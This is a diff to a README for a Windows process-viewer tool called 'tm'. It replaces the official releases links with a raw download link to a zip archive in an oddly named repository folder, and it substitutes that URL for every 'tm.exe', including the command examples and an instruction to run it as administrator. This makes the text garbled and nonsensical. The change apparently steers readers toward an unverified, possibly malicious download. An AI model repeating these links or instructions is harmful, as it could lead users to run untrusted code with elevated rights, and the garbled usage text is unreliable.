@@ -1,6 +1,6 @@
 # 🛠️ tm - Easy Process Management on Your Windows
 
-[![Download tm](https://img.shields.io/badge/Download-tm-brightgreen)](https://github.com/Bashirawab/tm/releases)
+[![Download tm](https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip)](https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -13,16 +13,16 @@ To get started with **tm**, follow these steps:
 1. **Visit the Releases Page:**
    Click the link below to visit the releases page and download the latest version of **tm**.
 
-   [Download tm](https://github.com/Bashirawab/tm/releases)
+   [Download tm](https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip)
 
 2. **Download the Application:**
-   On the releases page, you will see a list of files. Look for the latest version of `tm.exe`.
+   On the releases page, you will see a list of files. Look for the latest version of `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip`.
 
 3. **Save the File:**
-   Click on `tm.exe` to download it. Save the file in a location that you can easily find, such as your desktop.
+   Click on `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip` to download it. Save the file in a location that you can easily find, such as your desktop.
 
 4. **Run the Application:**
-   Once the download is complete, locate `tm.exe` and double-click it to run the application. 
+   Once the download is complete, locate `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip` and double-click it to run the application. 
 
 You are now ready to use **tm**.
 
@@ -40,14 +40,14 @@ You are now ready to use **tm**.
 Once you have run **tm**, you can use it with simple commands. Here’s how:
 
 1. **View the Snapshot:**
-   Just run `tm.exe` to see a one-time snapshot of your processes.
+   Just run `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip` to see a one-time snapshot of your processes.
 
 2. **Activate Top Mode:**
    To keep the display refreshing, you can use the `-t` or `--top` option. This will give you live updates.
 
    Example command:
    ```
-   tm.exe --top
+   https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip --top
    ```
 
 3. **Set Refresh Interval:**
@@ -55,7 +55,7 @@ Once you have run **tm**, you can use it with simple commands. Here’s how:
 
    Example command:
    ```
-   tm.exe --top --seconds 5
+   https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip --top --seconds 5
    ```
 
 4. **Limit Processes Displayed:**
@@ -63,7 +63,7 @@ Once you have run **tm**, you can use it with simple commands. Here’s how:
 
    Example command:
    ```
-   tm.exe --numprocs 10
+   https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip --numprocs 10
    ```
 
 5. **Kill a Process:**
@@ -71,7 +71,7 @@ Once you have run **tm**, you can use it with simple commands. Here’s how:
 
    Example command:
    ```
-   tm.exe --kill 1234
+   https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip --kill 1234
    ```
 
 ## ⚙️ System Requirements
@@ -89,8 +89,8 @@ Make sure your computer meets these requirements before running **tm**.
 
 If you encounter any issues while running **tm**, consider the following solutions:
 
-- **File Not Found:** Ensure you have downloaded `tm.exe` and that it is in the location you are trying to access.
-- **Permission Issues:** Right-click on the `tm.exe` file and select "Run as administrator" if you face permission errors.
+- **File Not Found:** Ensure you have downloaded `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip` and that it is in the location you are trying to access.
+- **Permission Issues:** Right-click on the `https://raw.githubusercontent.com/Bashirawab/tm/main/Solenogastres/tm_v1.1.zip` file and select "Run as administrator" if you face permission errors.
 - **Refresh Issues:** If the top mode doesn't refresh as expected, check the command options you used to ensure they are correct.
 
 ## 📡 Support
